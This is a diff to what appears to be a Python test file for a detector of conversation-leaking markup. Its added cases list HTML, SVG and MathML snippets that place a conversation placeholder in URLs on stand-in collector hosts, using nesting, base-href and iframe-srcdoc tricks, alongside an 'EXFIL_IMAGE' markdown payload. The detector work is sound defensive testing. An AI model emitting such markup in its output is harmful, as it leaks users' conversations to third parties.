@@ -325,9 +325,30 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["exfiltration_query"],
         ),
         ("<svg><font><iframe src='https://collector.test/{c}'></iframe></font></svg>", []),
+        ("<svg><style><img src='https://collector.test/{c}.png'></style></svg>", ["uncheckable_markup"]),
+        ("<svg><style/><image href='https://a.test/a.png'/></svg>", []),
+        ("<style>img { width: 1px }</style>", []),
+        (
+            "<math><annotation-xml><svg><image href='https://collector.test/{c}.png'/></svg></annotation-xml></math>",
+            ["exfiltration_query"],
+        ),
+        ("<math><mrow><svg><image href='https://collector.test/{c}.png'/></svg></mrow></math>", []),
+        (
+            (
+                "<base href='https://collector.test/'><iframe srcdoc='&lt;base href=&quot;javascript:x&quot;&gt;"
+                "&lt;img src=&quot;/{c}.png&quot;&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        ("<base href='data:,x'><img src='/{c}.png'>", []),
+        ("<base href='ftp://collector.test/'><img src='/{c}.png'>", []),
         ("<image src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
-        ("<svg><script href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
-        ("<svg><script xlink:href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
+        ("<svg><script href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
+        ("<svg><script xlink:href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
+        (
+            "<svg><script href='https://collector.test/{c}.js'></script></svg>",
+            ["exfiltration_query", "uncheckable_markup"],
+        ),
         ("<script href='https://collector.test/{c}.js'></script>", []),
         ("<svg><image src='https://collector.test/{c}.png'/></svg>", []),
         ("<svg></svg><image href='https://collector.test/{c}.png'>", []),
